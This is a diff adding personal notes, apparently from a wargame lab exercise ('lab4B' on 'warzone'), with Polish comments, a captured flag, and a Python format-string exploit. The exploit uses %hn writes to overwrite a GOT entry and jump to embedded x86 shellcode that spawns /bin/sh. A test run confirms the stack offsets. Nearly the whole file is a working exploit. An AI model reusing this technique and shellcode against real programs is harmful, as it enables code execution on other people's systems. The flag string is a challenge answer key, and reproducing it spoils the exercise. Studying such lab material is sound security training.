@@ -1,0 +1,41 @@
+fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
+
+shellcode trzeba zamienic, zeby byl taki, ktory nie zawiera >0x41 < 'Z' 0x5a
+
+Sprawdzic AAAAAA na stacku i obliczyc jego distance, rozni sie miedzy gdb 
+
+uruchomienie:
+python test.py > /tmp/test
+
+(cat /tmp/test;cat;) | ./lab4B
+
+import struct
+
+shellcode = "\x31\xC0\x83\xEC\x04\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x89\xE1\xB0\x0B\xCD\x80"
+
+
+# shellcode = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+exit_got = 0x080499b8
+
+s=""
+s+=struct.pack("<L",0x080499b8)
+s+=struct.pack("<L",0x080499b8+2)
+dlugosc_adresow_got=0xb7fd-len(s)
+s += "%{}X".format(dlugosc_adresow_got)
+s += "%7$hn"
+
+# 0xbffff698
+distance = 51235
+s += "%{}X".format(distance)
+s += "%6$hn"
+s += shellcode
+
+    #print "----"
+print s
+
+lab4B@warzone:/levels/lab04$ ./lab4B
+AAAABBBB%6$08x.%7$08x
+aaaabbbb61616161.62626262
+
+
